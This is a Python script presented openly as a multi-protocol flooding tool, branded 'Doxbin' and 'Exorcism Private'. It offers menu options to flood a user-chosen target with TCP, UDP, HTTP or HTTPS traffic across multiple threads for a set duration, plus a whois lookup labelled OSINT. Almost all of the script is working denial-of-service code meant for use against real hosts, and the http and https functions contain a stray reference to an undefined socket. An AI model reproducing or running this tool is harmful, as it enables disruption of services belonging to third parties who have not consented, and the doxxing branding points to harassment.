import socket
import threading
import time
import requests
import whois
from art import text2art

def print_big_text(text):
    print(text2art(text, font='block'))

def resolve_url(url):
    try:
        response = requests.get(url)
        return response.url
    except requests.exceptions.RequestException as e:
        print(f"Error resolving URL: {e}")
        return None

def tcp_attack(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        payload = b"\x00" * 1024  # You can customize the payload
        start_time = time.time()
        while time.time() - start_time < duration:
            client.send(payload)
        client.close()
    except Exception as e:
        print(f"Error: {e}")

def udp_attack(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        payload = b"\x00" * 1024  # You can customize the payload
        start_time = time.time()
        while time.time() - start_time < duration:
            client.sendto(payload, (target, port))
        client.close()
    except Exception as e:
        print(f"Error: {e}")

def http_attack(target, port, duration):
    try:
        payload = b"\x00" * 1024  # You can customize the payload
        start_time = time.time()
        while time.time() - start_time < duration:
            requests.get(f"http://{target}:{port}", timeout=5)
        client.close()
    except Exception as e:
        print(f"Error: {e}")

def https_attack(target, port, duration):
    try:
        payload = b"\x00" * 1024  # You can customize the payload
        start_time = time.time()
        while time.time() - start_time < duration:
            requests.get(f"https://{target}:{port}", timeout=5)
        client.close()
    except Exception as e:
        print(f"Error: {e}")

def osint_tool(domain):
    try:
        w = whois.whois(domain)
        print("\nOSINT Information:")
        for key, value in w.items():
            print(f"{key}: {value}")
    except Exception as e:
        print(f"Error performing OSINT: {e}")

def main():
    print_big_text("Doxbin")
    print_big_text("Exorcism Private")
    print("1. TCP Attack")
    print("2. UDP Attack")
    print("3. HTTP Attack")
    print("4. HTTPS Attack")
    print("5. OSINT Tool")
    choice = input("Select an option: ")

    if choice in ['1', '2', '3', '4']:
        target = input("Enter the target (IP or URL): ")
        port = int(input("Enter the target port: "))
        duration = int(input("Enter the duration of the attack (in seconds): "))
        threads = int(input("Enter the number of threads: "))

        if 'http' in target or 'www.' in target:
            resolved_url = resolve_url(target)
            if resolved_url:
                target = resolved_url.split('/')[2]  # Extract the domain name
                print(f"Resolved target: {target}")
            else:
                print("Failed to resolve URL. Exiting.")
                return

        if choice == '1':
            attack_func = tcp_attack
        elif choice == '2':
            attack_func = udp_attack
        elif choice == '3':
            attack_func = http_attack
        elif choice == '4':
            attack_func = https_attack

        for _ in range(threads):
            thread = threading.Thread(target=attack_func, args=(target, port, duration))
            thread.start()

    elif choice == '5':
        domain = input("Enter the domain for OSINT: ")
        osint_tool(domain)

    else:
        print("Invalid option. Exiting.")

if __name__ == "__main__":
    main()
